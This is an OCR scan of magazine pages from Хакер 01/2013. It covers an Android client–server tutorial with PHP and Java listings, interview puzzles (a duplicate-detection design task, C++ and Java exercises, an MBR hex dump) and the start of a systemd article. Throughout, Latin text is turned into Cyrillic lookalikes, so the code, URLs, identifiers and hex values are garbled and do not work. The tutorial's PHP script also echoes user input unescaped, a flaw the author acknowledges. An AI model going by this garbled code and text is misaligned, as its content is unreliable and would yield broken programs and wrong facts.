в Апсігоісі. 



102 



ХАКЕР 01 /168/2013 



Наш клиент — андроид! 




Код серверного приложения приведен в листинге 1. Его следует 
поместить на своем хостинге или на ІосаІЬозІ, предварительно 
подняв АрасНе или другой НТТР-сервер с поддержкой РНР. 

Листинг 1. Сценарий вегѵег.ріір 

<?рНр 

// Получаем команду 
$стй = $_КЕ(2иЕ5Т[’стсГ]; 

// Определяем переданную команду 
і + ($стсІ == "НбТ") { 

// Выводим список ОС 

есНо "1іпих,-РгееЬ5СІ.,тасо5,апсІгоісГ; 

} 

е1зеі-Е($стсІ == "зеіес*") { 

// Ответ клиенту после выбора ОС 

$05 = $_КЕдиЕ5Т[ , 05']; 

есііо "СНепТ сИоозе $05 и ; 

> 

еіае , . 

есЬо 

?> 

Проверить, как работает скрипт, можно на моем сайте: 

ИТТр : //сІкм5 . ог§ . иа/зегѵег . рИр?стсІ=1І5Т 

ШТр : //гікиз . ог§ . иа/$егѵег . рНр?стсІ=5е1ес*&05=1іпих 

Команда Іізі отображает список доступных операционных 
систем (через запятую). Почему нет \^іпсЛоѵѵ5? Потому что я так 
захотел. А команда зеіесі «выбирает» операционную систему. 

По сути, она отображает содержимое параметра оз. Если ты пере- 
дашь в качестве этого параметра значение Мпсіоѵѵз, то клиенту 
будет передана строка СІіепІ сЬоозе ѴѴіпсіоѵѵз. Можно считать это 
неким недочетом нашего «сервера». Но не хочу усложнять код 
лишними и никому не нужными проверками (если хочешь, можешь 
дописать несколько строк кода). Да и поскольку клиент отобража- 
ет только варианты, перечисленные нашим сервером, то пользова- 
тель при всем своем желании не сможет передать другой вариант. 
Напрямую через браузер — сколько угодно. Но наше Апсігоігі- 
приложение никогда не отобразит строчку СІіепІ сЬоозе ѴѴіпгіоѵѵз. 
После лета с ѴѴіпгіоѵѵз 8 у меня некоторая аллергия на эту систему. 
Система, может, и хорошая, но для меня ее стало слишком много. 

По сути, вот и все. Наше серверное приложение готово. Можешь 
усложнять его до такой степени, как тебе нужно (добавлять новые 
команды, обрабатывать выбор пользователя), но основная идея 
останется прежней: получили команду от клиента, обработали ее 
и отправили результат. В этом и заключается идея клиент-сервер. 



РАЗРАБОТКА АШКОЮ-КЛИЕНТА 

Теперь приступим к разработке клиента. Он будет состоять из двух 
классов — СІіепіБегѵегАсІіѵіІу^аѵа и 5егѵегІ(асе.)аѵа. Первый 
управляет деятельностью приложения: при запуске он отправляет 
запрос серверу [команда стсНізі), получает ответ сервера и запол- 
няет 1_І5іѴіе\л/. Отправкой запроса и получением ответа занимается 
класс БегѵегКасе.іаѵа. 

КЛАСС 5ЕРѴЕРІРАСЕ.МѴА — «ОБЩЕНИЕ С СЕРВЕРОМ» 

Первым делом реализуем именно класс БегѵегНасе.іаѵа, поскольку 
он будет использоваться классом СІіепі5егѵегАс*іѵіІу.]аѵа. Именно 
в 5егѵегКасе.]аѵа задаются и адрес серверного приложения, и до- 
пустимые параметры, которые будут передаваться серверу. 

Основной метод — ЖірРериезіП. Именно он отвечает за от- 
правку данных по соединению сопі, которое устанавливается 
с сервером (адрес задается константой 5ЕРѴЕР_РНР). Метод 
использует два потока данных — исходящий ІсіаІаОиІ) и входящий 
(сіаіаіп). Первый поток используется для отправки запроса серверу, 
второй — для получения ответа. В случае ошибки метод возвраща- 
ет пустую строку. 

Листинг 2. Метод НТТрКециезТ 

раска§е сот.сІІізіІаЬз.сз; 
ітрогТ іаѵа. іо.ОаТаІприТБТгеат; 
ітрогТ ^аѵа. іо.ОаТаОиТриТБТгеат; 
ітрог* заѵа.іо.ІОЕхсерІіоп; 
ітрогТ заѵа.пеТ.ІЖІ.; 
ітрогТ заѵа.пеТ.ІІКІ_СоппесТіоп; 
ітрогТ ]аѵа.пе*.ІЖІ_Епсос1ег; 



риЬІіс БТаТіс бпаі 5Тгіп§ 5ЕКѴЕК_РНР = "ЬТТр://мѵ/ѵ/.сІкм5. 
ог§ . иа/зегѵег . рНр" ; 



ргіѵаТе БТаТіс 51:гіпе Н**рРеяие5Т(51:гіп§ сІаТа) { 
5Тгіп§ гезиІТ = 

Игу { 

ІЖІ. игі = пей ІЖІ_(5ЕКѴЕК_РНР); 
ІЖІСоппесТіоп сопі = игі .орепСоппесТіоп( ); 
// Определяем параметры соединения. 

// Мы будем передавать и принимать данные, 
// а также отменяем кеширование данных 
сопі . 5еТ0оІпри1:(Тгие) ; 
сопі . зеТ0о0иТри!(1:гие); 



ХАКЕР 01 /168/2013 



103 





кодинг 



сопі . 5е1:ІІ5еСасЬе5(^аІ5е ) ; 

сопі . БеІіКедиеБІРгорегСу ( "СопТеп1:-Туре и , 

"аррІіса^іоп/х-иѵм-^огт-игІепсосІесГ ) ; 

// Отправляем РОБТ-данные 
Оа1:аОи*рігІ:51:геат сІаТаОиІ: = пем ^ 
ОаТаОи-СриІіБІігеагтКсопІ . ве1:Ои*ри1:51:геат( ) ) ; 
сІа1а0иі:.мгіі:еВу1:е5(сІа1:а); // Записываем данные 
сІаІіаОиІ: . ЛизИ ( ) ; // Сбрасываем буфер 

сІаІіаОиІ; . с1озе( ) ; // Закрываем исходящий поток 

//данных 

// Получаем ответ от сервера и сохраняем его 
// в переменной гезиіі: 

Оа-ЬаІприІБІігеат сІа1:аІп = пей Эа1:аІпри1:51:геат^ 

(сопі . §е*Іприі:5і:геат( ) ) ; 

5*гіпе іпри-Ыіпе; 

иЬіДе ((іприНіпе = сІа^аІп.геасЛіпеО) != пиіі) { 
геБиІ* += іпри-Ыіпе; 

} 

// Закрываем входящий поток данных 

с1аТа1п.с1о5е(); 

> саТсН (ІОЕхсерІіоп е) { 

// В случае ошибки возвращаем пустую строку 
е . ргіп*51:аскТ гасе ( ) ; 
гезиі* = пиіі; 

} 

геТигп геБиІТ; 

> 

Кроме метода НирПедиез*, в этом классе есть два метода — 
де(0ЬіІ_І5і() и деіБеІесіВезП. Они определяют, какая информация 
будет передана серверу. Первый метод передает серверу параметр 
стс1=ІІ5І, а второй — стсі=5еІесІ&05=выбранная_ос. Оба метода 
после формирования запроса вызывают метод НирВедиез* для от- 
правки запроса. 

Листинг 3. Методы §еШ)]1.з.5*() и §е*Бе1ес1:Ке5() 

риЫіс 5І:аТ:іс 5*гіп§ { 

// Для получения списка объектов передаем параметр 
// стсІ=1І5Т 

5*гіп§ сІа-Са = "стсІ=" + ^К^ЕпсосIег.епсосIе( ,, 1і51: ,, ); 
геТигп Н1:-СрРедие5*(сІаТа); 

} 

риЫіс 5І:а*іс 5*гіп§ веі:5е1есі:Ре5(5і:гіп§ оЬз) { 

11 Пользователь выбрал ОС, передаем выбор 
/X пользователя стсІ=5е1есі:&о5=<выбор> 

Б'Сгіпе сіаіа = ”стсІ=" + икіЕпсосІег.епсосІеС’БеІес'І:"); 
сІаТа += "&05=” + ІЖІ_ЕпсосІег.епсосІе(оІ^); 
геТигп Н**рРедиеБ*(сІаТа); 

} 

Методы предельно просты. Их задача сводится к формированию 
строки запроса и вызову метода НШрПедиезІ. 

Не волнуйся, полный исходный код приложения ты найдешь 
на прилагаемом диске. Тебе останется только импортировать 
его в Есіірзе (команда Рііе, Ітрогі). Позже я даже покажу, как это 
сделать. 

КЛАСС СИЕМТ5ЕРѴЕВАСТІѴІТѴ.ЗАѴА — 

УПРАВЛЕНИЕ СПИСКОМ ОПЕРАЦИОННЫХ СИСТЕМ 

Класс СІіепіБегѵегАсІіѵіІу^аѵа немного мудренее, чем предельно 
простой класс БегѵегНасе^аѵа. Конечно, в реальном проекте класс 
БегѵегКасе.іаѵа, обрабатывающий запросы к серверу, может быть 
чуть сложнее, но не слишком. Задача класса СІіепіБегѵегАсІіѵіІу. 
Іаѵа заключается в управлении пользовательским интерфейсом 
приложения. 

При запуске приложения мы запускаем фоновый поток, который 
получит список объектов от сервера. Поскольку сервер передает 




Рис. 3. Импорт проекта: нажми «Ыехі» 

нам список объектов в виде строки, где они разделяются запяты- 
ми, придется обработать эту строку, то есть разобрать ее: превра- 
тить строку-список в массив строк. А уже после этого — поместить 
элементы полученного массива в список. 

При выборе операционной системы пользователем запускает- 
ся еще один фоновый поток, отправляющий выбор пользователя 
на сервер. Ответ от сервера также получается в фоновом режиме 
и отображается в виде уведомления. 

Теперь, когда мы знаем, что и как должно работать, перейдем 
к самому главному — коду. Обработчик нажатия элемента списка 
выглядит так: 

ИБІѴіем Іѵі = -СЬіБ.веНІБТѴіемО; 
1ѵ1.5е-С0пІ-СетС1іскІІ5Тепег(пем ОпІ1етС1іск1.і5Тепег() { 

(ЭОѵеггісІе 

риЫіс ѵоісі опІ*етС1іск(АсІарі:егѴіем<?> рагепТ, «-• 

Ѵіем ѵіеы, іпі: робіТіоп, 1оп§ ісі) { 

Г 

* Запускаем поток Се*5е1ес*КеБ в фоновом режиме 

* без блокирования основного потока 

* пользовательского интерфейса 
V 

(пем СеТ:5е1есТ:Ке5Та5к()) .ехеси-Се^ 

( (ОЬдес*) ( (ТехіЛ/іеѵОѵіем) . ее1:Тех-С( ) ) ; 

} 

ш 

После установки обработчика нажатия элемента списка нужно 
запустить еще один фоновый поток — для получения самих эле- 
ментов списка: 

(пей СеТІ_І5*Та5к()) .ехесиТе((ОЬ}‘ес1:)пи11); 

В листинге 4 приводится метод беНізіТазк. Его задача — вы- 
звать метод БегѵеЖасе.деЮЬіизЦ), получить список операци- 
онных систем, разделенных запятой, разобрать его и загрузить 
в список. 



104 



ХАКЕР 01 /168/2013 



Наш клиент — андроид! 



Листинг 4. Метод Се*І.І5*Та5к 

ргіуаТе СІ355 СеТИзТТазк ехіепсІБ АзупсТазк { 

// Вызываем 5егѵегІТасе.веТОЬ;)1.і5Т( ) и получаем 

// список систем 

ргоТесТес! 5*гіп§ с1оІпВаск8гоипа(0Ь]есТ. . . аг§ 5 ) { 
геТигп 5егѵегІТасе.§еТ0Ь}І.І5*(); 

} 

// Разбираем полученный результат 

ргоіесіесі ѵоісі опРо5*Ехеси*е(0Ь]ес-1: оЬ]Ке5и1*) { 

У/ Проверяем, что мы обрабатываем строку, 

// а не что-то еще 

і-р(оЬэРе5и1* != пиіі && оЬзКеБиІ* іпБіапсео-Р «-» 

5Тгіп8) { 

// Ке$ропзе - ответ сервера (список, разделенный 
// запятыми) 

5*гіп§ гезропзе = (5*гіп§) оЬзКезиІТ; 

// После разбора строки здесь будут храниться 
// элементы списка 
5*гіп§[] гезропБеИзТ; 

// Элементы списка разделяются запятой 

БТгіп^Токепігег С = пеы 
51гіп§Токепі2ег(ге5роп5е, 

// Задаем длину гезропзеИзТ 

геБропБеІЛБ* = пеы 5*гіп§[Т.соипі:Токеп5()]; 

// Строим массив строк (геБропБеІЛБі) 

ІО*, і * 0; 

ыЬі1е(Т.На5МогеТокеп5()) { 

гезроп5еІ.і5*[і++] = С.пех1Токеп() ; 

} 

// Подготавливаем структуру данных для 




Рис. 4. Выбор проекта для импорта 



// І.І5ТАс*іѵіТу 

АггауАсІарТег< 5 ігіп§> пеыАсІарТег = пеы — 
АггауАсІар*ег< 5 *гіп§> (шаіпАсііѵіТу, «-• 

КЛауоиТ.ПБ*, геБропБеИз*); 
таіпАсТіѵіСу . 5 е*И 5 *Ас 1 ар*ег(пеыАс 1 арТег); 

} 

} 

} 

Осталось только разобраться с методом СеіЗеІесіРезТаБкП. Его 
задача — вызвать 5егѵегІІасе.деі5еІесіНеБ(], получить ответ и ото- 
бразить как уведомление. Нет ничего проще: 

5 *гіп§ об = ( 5 *гіп 8 ) аг 85 [ 0 ]; 
геіигп 5 егѵегІ-Расе.§е 1 : 5 е 1 ес*Ке 5 (о 5 ) ; 



5*гіп§ геБропБе = (5*гіп§) оЬзКеБиІ*; 
ТоаБ*.такеТех*(8е1Арр1ісаТіопСоп1:ех1:(), геБропБе, ♦-» 

ТоэбТ . 1-ЕМСТН_5Н0КТ) . бЬоы ( ) ; 

ПОЧТИ ВСЕ 

Это еще не все. В гез/іауоиі нужно создать файл іібі.хгтіі. Это и будет 
разметка нашего списка. Данный файл приведен в листинге 5. 

Листинг 5. Файл ІІБі.хтІ 

<?хт1 ѵег5іоп= ,, 1.0" епсо<Ип§= и и*-Р-8"?> 

<Тех*Ѵіеы хшіпб : апс!гоісІ="ІгС*р: //БсИетаз . апсігоісі . сот/арк/ 
геБ/апсІгоісІ" 

апс!гоісІ:1ауои*_ > ыісІ*Іі= , ’б11_рагеп* м 
апсігоісі :1ауои*_Иеі§НТ="й11_рагепТ" 
апсігоісі : расНіпв- ,І 1ѲсІр ,а 
апсігоісі :*ех*5і2е="1б5р” > 

</Тех*Ѵіеы> 

Чтобы наш проект заработал, нужно в АпсІгоісІМапі^еБі.хтІ до- 
бавить строку: 

сизеБ-регтіББіоп апсігоісі : пате=" апсігоісі . регтіББІоп.ІМТЕК- 
МЕТ"х/и5е5-регтІ55Іоп> 

РЕЗУЛЬТАТ 

На рис. 1 изображен список операционных систем, полученных 
от сервера, а на рис. 2 — уведомление с выбранной пользователем 
операционной системой. 

Что-то непонятно? Не беспокойся, все файлы проекта ты смо- 
жешь найти на прилагаемом йѴО. Распакуй файлы в каталог 
рабочего пространства (ѵѵогкзрасе). Выбери команду Рііе, Ітрогі, 
в появившемся окне (рис. 3) нажми кнопку «ІМехІ», а затем вы- 
бери каталог с проектом (рис. 4). В моем случае проект уже есть 
в рабочем пространстве, поэтому я не могу его импортировать (что 
вполне логично), а у тебя будет активна кнопка «РіпібЬ», которую 
и нужно нажать. Флажок Сору ргоіесіз іпіо могкврасе включать 
не нужно, потому что проект уже в рабочем пространстве. 

После этого нужно выполнить команду Ргоіесі, ВиіІсІ Ргоіесі, 
а затем Рип, Рип — для запуска проекта. Ты увидишь приложение, 
изображенное на рис. 1 (при условии, что Апсігоісі 5ЭК и ЮЕ Есіірзе 
настроены соответствующим образом и нормально функционируют). 

Сценарий зегѵег.рЬр будет на моем сервере до марта 2013 
года. После чего, увы, для запуска этого приложения тебе при- 
дется выложить его на своем хостинге или развернуть локальный 
веб-сервер (это легко сделать в ѴѴіпсіоѵѵб с помощью ХАМРР, 
а если у тебя Ыпих, то, думаю, ты и без меня знаешь, как настро- 
ить Апач). 

Все твои вопросы, пожелания и замечания готов выслушать 
по адресу сіііБІІаЬБЙдппаіІ.сот или на форуме .■■■■ѵ ѵѵѵ.хакер.ги . I 



ХАКЕР 01 / 168/2013 



105 



кодинг 



Александр Лозовский (АІехапгіегйгеаІ.хакер.ги) 



ПОДБОРКА 

ИНТЕРЕСНЫХ 

ЗАДАНИЙ, 

КОТОРЫЕ ДАЮТ 
НА СОБЕСЕДОВАНИЯХ 



Задачи 




на собеседованиях 



Мегазадача от Яндекса 



ВВЕДЕНИЕ 

Есть такая задача — поиск нечетких дубли- 
катов. Например, когда у нас десять мил- 
лиардов писем или страниц в интернете и 
нужно сказать, что вот в этих письмах или 
страницах написано примерно одно и то же, 
при том что может отличаться оформление 
или часть текста. Применить обычную метрику 
близости — например расстояние Левенштей- 
на — тут нельзя, так как придется произвести 
100 триллионов сравнений и это закончится 
приблизительно никогда. 

Помочь может хакерский метод под названи- 
ем алгоритм шинглов. На пальцах он объясня- 
ется примерно так: считаем контрольные суммы 
(сгс) всех подстрок документа с нахлестом, со- 
ртируем и берем 20 наименьших сгс. Утвержда- 
ется, что при этом мы каждый документ опишем 
20 циферками и у похожих документов будут по- 
хожие циферки. Замечу, это самый тупой способ, 
есть гораздо более гламурные. 

ЗАДАЧА 

Итак — у нас есть 10 миллиардов документов 
и N цифр для каждого из них. Ты хочешь напи- 
сать базу данных, где лежат эти М*10В циферок, 
чтобы можно было 

а) быстро вставить в неедокумент; 

б) быстро найти его дубликаты — все докумен- 
ты, укоторыхсовпадаетбольше чем Кцифр. 

Спроектируй соответствующую систему. 
Писать ничего не надо, надо словами объяс- 
нить, что ты хочешь сделать. 



Требования к ней такие: 

а) система должна бытьбыстрой. В нашем по- 
нимании базы данных общего назначения, 
типа ВегкІеуйВ и МуЗСІЦ — для такой задачи 
это невообразимо медленно; 

б) все твои данные на одну машину не влезут, а 
если и влезут, то не справятся по скорости, 
поэтому система должна уметь использо- 
вать много серверов; 

в) на каждом сервере много СРІ), подумай о 
том, какты собираешься это использовать. 

Пояснение: это не задача, которая предпо- 
лагает конкретный ответ, это скорее тема для 
диалога. Существует много решений, но в Рос- 
сии, наверное, меньше ста человек, которые 
могут с первого раза выдать правильное. Этой 
задачей мы проверяем не конкретные знания, 
а умение проектировать, общаться, видеть 
и обходить грабли. Даже если ты не нашел 
решения сам, но способен нормально на эти 
темы говорить, то это зачет. 

ОТВЕТ 

Для простоты давай считать, что все данные 
мы засунем в память. Данных достаточ- 
но много, но займут они всего 4*М*10 Гб 
(ну и, допустим, еще столько же понадобится 
для служебной информации типа ІІРЦ. Таким 
образом, если мы собираем 20 цифр, нам нуж- 
ны всего 1600 Гб памяти, в 2012 году все это 
добро влезет на 6-8 жалких серверов. 

Мы, естественно, не хотим для каждого 
документа просматривать все 10В докумен- 



тов, поэтому нужно сделать специальную 
структуру, примерно такую: шингл — » йі 
04 ..., 017... (то есть шингл и упорядоченные 
номера документов, в которых он встречает- 
ся). По науке такая штука называется инвер- 
тированный индекс, а на жаргоне — просто 
«кишки». 

Поиск выполняется так: берем N «кишок» 
шинглов, которые у нас есть, и, пользуясь тем, 
что «кишки» упорядочены, пробегаемся по 
ним и складываем. Добавление выполняется 
так: берем N «кишок», в каждую в конец до- 
писываем номер документа, так как документ 
только что добавился, у него самый послед- 
ний номер и сортировать «кишку» не надо. 

Осталось понять, как это порезать по 
серверам. Резать можно по шинглам и по до- 
кументам. По документам резать приятнее — 
весь поиск получается на одной машине и не 
надо длиннющие многомегабайтные «кишки» 
таскать по сети (например, документы с 1 
по М будут на первой машине, с М + 1 до 2М 
на второй и так далее). Нужно будет написать 
специальный сервер, который при поиске 
раздает запрос на все серверы, а потом скле- 
ивает результаты. Добавляем мы, соответ- 
ственно, только на последнюю машину. 

С использованием многих СРІІ совсем про- 
сто — есть примитивы синхронизации, то, что 
мы хотели бы здесь услышать, — что не надо 
лочить весь индекс целиком для вставки 
одного документа, достаточно лочить только 
определенные «кишки», при этом геасі-ѵѵгііе 
локом. 



106 



ХАКЕР 01 /168/2013 



Задачи на собеседованиях 



ЗАДАЧИ НА ДОМ 



Предлагаем твоему вниманию свежую партию 
задач, решения для которых будут опублико- 
ваны в следующем номере. До тех пор попы- 
тайся порешать их сам. 



Задача от Асгопіз № 1 



ѵоісі ргіпТ(сопз1: сЬаг* і) { 

5*сІ : : соиТ << і; 

} 

іпТ таіп(){ 

соп5Т сЬаг* І.с1т[] = {"О", "А”, "С", «-< 
"В”, "Е">; 

з1сІ::5еТ -РеаТиге5(1.сІт, І.гіт + 5); 

5ТсІ: :-Роп_еасИ(-Реа1:иге5.Ье§1п(), 
ТеаТиге$.епсІ(), ргіпТ); 

геТигп 0 ; 

} 

Вопрос короткий: что будет выведено в консоль? 



Задача от Асгопіз № 2 



Напишите метод, который будет подсчитывать количество цифр 
2, используемых в записи чисел от 0 до п включительно. 



Задача отОгоир-ІВ 



Сколько разделов имеется на носителе информации согласно 
представленному изображению (да, мы про МВР)? 

Сколько загрузочных (активных] разделов имеется на носителе 
информации согласно представленному изображению? 

В какую файловую систему размечены разделы на носителе 
информации согласно представленному изображению? 



О Ііжтг 012345 
0000000000 33 СО 8Е ОО ВС 00 
0000000010 ВГ 1В 06 50 57 В9 
0000000020 ЗВ 6Е 00 7С 09 75 
0000000030 83 С6 10 49 74 19 
0000000040 ГО АС ЗС 00 74 ГС 
0000000050 4Е 10 ЕВ 46 00 73 
0000000060 80 7Е 04 ОС 74 05 
0000000070 46 08 Об 83 56 ОЛ 
0000000080 ВС 81 ЗЕ РЕ 70 55 
0000000090 В7 07 ЕВ А9 9В ГС 
ООООООООАО 00 В4 08 СО 13 72 
ООООООООВО 43 Г7 ЕЗ 8В 01 86 
00000000С0 ОА 77 23 72 05 39 
ОООООООООО 8В 4Е 02 8В 56 00 
ООООООООЕО 56 00 СО 13 ЕВ Е4 
ООООООООРО 13 72 36 81 ГВ 55 
0000000100 6А 00 6А 00 ГГ 76 
0000000110 01 6А 10 В4 42 8В 
0000000120 32 Е4 8А 56 00 СО 
0000000130 6С 69 64 20 70 61 
0000000140 62 6С 65 00 45 72 
0000000150 67 20 6Г 70 65 72 
0000000160 65 60 00 40 69 73 
0000000170 74 69 6Е 67 20 73 
0000000180 00 00 00 00 00 00 
0000000190 00 00 00 00 00 00 
ОООООООІАО 00 00 00 00 00 00 
ОООООООІВО 00 00 00 00 00 2С 
ОООООООІСО 01 00 07 ГЕ гг гг 
0000000Ю0 С1 ГГ 05 ГЕ ГГ ГГ 
ОООООООІЕО 00 00 00 00 00 00 
00000001Г0 00 00 00 00 00 00 

Код МВР — тавіег Ьооі гесопі 



67 8 9 А В С О 

7С ГВ 50 07 50 1Г ГС ВЕ 
Е5 01 ГЗ А4 СВ ВБ ВЕ 07 
13 83 С5 10 Е2 Г4 СО 18 
38 2С 74 Гб АО В5 07 В4 
ВВ 07 00 В4 ОЕ СО 10 ЕВ 
2А ГЕ 46 10 80 7Е 04 ОВ 
АО В6 07 75 02 80 46 02 
00 Е8 21 00 73 05 АО В6 
АА 74 ОВ 80 7Е 10 00 74 
ІЕ 57 8В Г5 СВ ВГ 05 00 
23 8А С1 24 ЗГ 98 8А ОЕ 
Об В1 06 02 ЕЕ 42 Г7 Е2 
46 08 73 1С ВВ 01 02 ВВ 
СО 13 73 51 4Г 74 4Е 32 
ВА 56 00 60 ВВ АА 55 В4 
АА 75 30 Гб С1 01 74 2В 
ОА ГГ 76 08 6А 00 68 00 
Г4 СО 13 61 61 73 ОЕ 4 Г 
13 ЕВ Об 61 Г9 СЗ 49 6Е 
72 74 69 74 69 6Г 6Е 20 

72 6Г 72 20 6С 6Г 61 64 
61 74 69 6Е 67 20 73 79 

73 69 6Е 67 20 6Г 70 65 
79 73 74 65 60 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
44 63 С8 ОВ С9 ОВ 00 00 
ЗГ 00 00 00 08 ІА С4 09 
17 1В С4 09 АА 6Г 00 08 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 



Е Г 

ІВ 7С ЗЛАРэ ІЫР Р ъа I 
В1 04 1 РН»е уоЛЗа * 

6В Г5 8п I и гЕ афн «х 
07 8В іг 8, си и х* < 
Г2 88 р-К сь» г К лтС 
74 ОВ N ИГ а*юГ А- С 

06 83 А- С 1 иТАГ * 

07 ЕВ Г *Ѵ иі а «л 

се АО і >ю)оес а~ си 
8А 56 • лв<ь И< хЛ 1 ЯѴ 

ел ГС ГН г»*В$?*Шьь 
39 56 СчічСТЦС ТоВчв9Ѵ 
00 7С ѵ#г 9Г а I » | 
Е4 8А <н <ѵ н воогигая 
41 СО V Н ЛДАѴ *€"ГАН 
61 60 гб ьЮСиОцБ с+а 
7С 6А э і яѵ лѵ і А Іі 
74 ОВ з гВ< фн ааа Ос 
76 61 2дЛѴ Н лЦавГІг.ѵа 
74 61 Ііа рагсісіоп са 
69 6Е Ыа Еггог Іожгііп 
73 74 д оржгжсіпд ауас 
72 61 аш Міааіпд орага 
00 00 сіпд ауасат 

00 00 
00 00 
00 00 

80 01 ,ОсИ Я А 

00 00 юял? Ш Д 
00 00 Бя юяя Д €оЭ 
00 00 

55 АА це 



Задача от Т-Эузіетз № 1 



БиЬзеяиепсе 

Заданы две последовательности XI, Х2, Хп и VI, У2, 

Ѵк произвольных элементов (іаѵа.Іапд.ОЬ]есІ). Определить, 
можно ли получить последовательность X путем вычеркивания 
некоторых элементов из V. 

В качестве входных параметров в метод передаются два 
списка: первый — список Хі, второй — список Ѵі. 



Задача от Т-Бузіетв № 2 



ОирІІсаІез 

Составить программу для обработки файла по следующему 
алгоритму. Задается входной файл, содержащий текстовые 
строки. Программа обрабатывает его и создает в указанном 
месте выходной файл, содержащий отсортированные по алфа- 
виту неповторяющиеся строки исходного файла. В конце каждой 
строки в квадратных скобках указывается количество повторе- 
ний данной строки во входном файле. 

В качестве входных параметров в метод передаются два фай- 
ла: первый — входной, второй — выходной. Метод возвращает 
Ігие тогда и только тогда, когда обработка файла прошла успеш- 
но. При возникновении ошибок программа должна вернуть {аізе. 

Не гарантируется, что данные файлы существуют. В случае 
если выходной файл не существует, он должен быть создан. Если 
он существует, необходимо дописать результат выполнения про- 
граммы, без перезаписи уже содержащейся там информации. 



ЫВ: Для обеих задач от Т-5Ѵ5ТЕМ5 необходимо выполнить сле- 
дующие условия: 

• Приложение должно быть написано на языке .Лаѵа 1.6 без ис- 
пользования дополнительных библиотек — только стандарт- 
ные классы + интерфейсы, относящиеся к заданию. 



• Плюсом будет зіаіеіезз-реализация. 



Название 

интерфейса 

Имя класса 

Имя архива 



сот.ІзузІетз.іаѵазсЬооІ.Іазкз. 

ОирІісаІеРіпсІег 

сот.ІзузІетз.іаѵазсЬооІ.Іазкз. 

ОирІісаіеРіпсІегІтрІ 

сіиріісаіез.іір 



— 

МѴА 5СН00І. ОТ Т-5Ѵ5ТЕМ5 



Если ты успешно справился с заданием, Т-ВуБІетз приглашает тебя 
на обучение в ^ѵа БсЬооІ в Санкт-Петербурге. Во время обучения 
выплачивается стипендия, лучших возьмут на работу. Для этого 
предварительнозапроси интерфейсы поадресуіаѵа.5сНооІ(сК- 
зузіетз.ги, указав ФИО и контактные данные. Интерфейсы 
должны быть реализованы в классах с определенными именами, 
которые, в свою очередь, должны иметь публичные конструкторы 
без аргументов. Исходный код необходимо прокомментировать, 
упаковать віір-архив и прислатьобратнонаіаѵа.всЬооігаі-вузІетв. 
ги. Учебные группы набираются регулярно в течение года. 



ХАКЕР 01 /168/2013 



107 









ІШІХОЮ 



Евгений Зобнин (ехесЫі.ги) 




КРАТКИЙ 
ЭКСКУРС 
В ТЕОРИЮ 
И ПРАКТИКУ 
5Ѵ5ТЕМ0 

В 2010 году Леннарт Поттеринг 
представил миру новую систему 
инициализации под названием 
5у5Іет<± И хотя с тех пор прошло 
всего два года, вузіетсі был 
включен в самые популярные 
дистрибутивы и успел впитать 
в себя функциональность такого 
количества когда-то сторонних 
сервисов и библиотек, что 
среднестатистическому 
линуксоиду уже проблематично 
разобраться в тонкостях работы 
дистрибутива. 



ВВЕДЕНИЕ 



Задуманный как всего лишь современная 
высокопроизводительная версия демона іпіі, 
со временем зузіелпсі превратился в насто- 
ящий комбайн. Сегодня Бузіетсі не только 
отвечает за корректный запуск и остановку 
сервисов, но и выполняет функции настройки 
системы и окружения, отвечает за логин поль- 
зователей, за горячее подключение устройств 
(аналог исіеѵ), выступает в качестве полно- 
ценной и более продвинутой замены зузіод, 
способен устанавливать системные ограни- 
чения на возможности запускаемых сервисов 
(песочница), запоминать и восстанавливать 
состояние системы (снэпшоты) и даже включа- 
ет в себя полноценный веб-сервер и генератор 
ОР-кодов! 

Это далеко не полный список возможностей 
зузіетсі, поэтому разобраться в нем, используя 
всего лишь маны и официальную докумен- 
тацию, весьма проблематично. Чтобы дать 
тебе хоть какой-то вводный курс в этот, уже 
ставший стандартом в мире Ыпцх, комбайн, 
мы и подготовили нашу статью. Она отнюдь 
не претендует на полноту (здесь потребова- 
лась бы целая книга!), но может стать отлич- 
ным введением и справочником для тех, у кого 
просто нет времени разбираться во всем, 
что накодил «безумный Поттеринг». 



ТЕОРИЯ 



Итак, что же такое зузіетсі? Правильнее всего 
охарактеризовать его как набор сервисов 
и утилит, отвечающих за общее состояние 
Ыпих-системы, начиная от запуска и оста- 



новки сервисов и заканчивая логированием 
системных событий и автомонтированием 
сменных накопителей. Легче всего понять 
это, просто приняв тот факт, что в современ- 
ных дистрибутивах (таких как Ресіога и 51І5Е, 
но не ІІЬипМ теперь нет іпіі, зузіод, сгоп, исіеѵ, 
іпеЫ, 1ср_ѵѵгаррегз, ѵѵаІсЬсіодсі, СопзоІеКіІ, 
асрісі, а их место и место многих других 
классических инструментов (ЬаІІ, збиісіоѵѵп, 
гипіеѵеі, Іеііпіі) занимает зузіетсі с единым ин- 
терфейсом управления, единым хранилищем 
конфигов и одной кодовой базой. 

Главной задачей зузіетсі является запуск 
и корректная остановка сервисов (демонов). 

В этом деле у зузіетсі есть сразу три козыря, 
которые существенно отличают его от других 
систем инициализации: декларативный язык 
описания, новый подход к учету зависимостей 
сервисов и отложенный запуск. Декларатив- 
ный язык используется для описания того, 
что необходимо сделать для запуска сервиса. 

В отличие от обычных зНеІІ-скриптов, ис- 
пользуемых в стандартных системах инициа- 
лизации, он полностью обрабатывается самим 
демоном зузіетсі, что существенно сокращает 
общее время загрузки и избавляет от необ- 
ходимости использовать внешние утилиты, 
такие как есЬо, саі, зесі, дгер и аѵѵк. 

Новый подход к учету зависимостей, поза- 
имствованный у Мае 05 X, основан не на зави- 
симости демонов друг от друга, как это сделано 
в других іпіі-системах, а на зависимости де- 
монов от ресурсов, в частности сокет-файлов, 
принадлежащих другим демонам. Так, вместо 
того чтобы запускать последовательно зузіод. 



108 



ХАКЕР СП /168/ 2013 






Исполин, каких немного 



-- Ьодз Ьедіп аі Поп, 2012-11-19 03:04:44 УЕКТ, епО аі Поп, 2012-11-19 03:18:29 ѴЕКТ. -- 
Иоѵ 19 03:04:44 ІосаІЬозі зузіетс!-^оигпа1[141] : ЯПоиіпд гипііте .іоигпаі Шез Іо дгош іо 100. ЗМ 
Ноѵ 19 03:04:44 ІосаІЬозі кегпеі: Іпіііаіігіпд сдгоир зиЬзуз сризеі 

Иоѵ 19 03:04:44 ІосаІЬозі кегпеі: Іпіііаіігіпд сдгоир зиЬзуз сри 

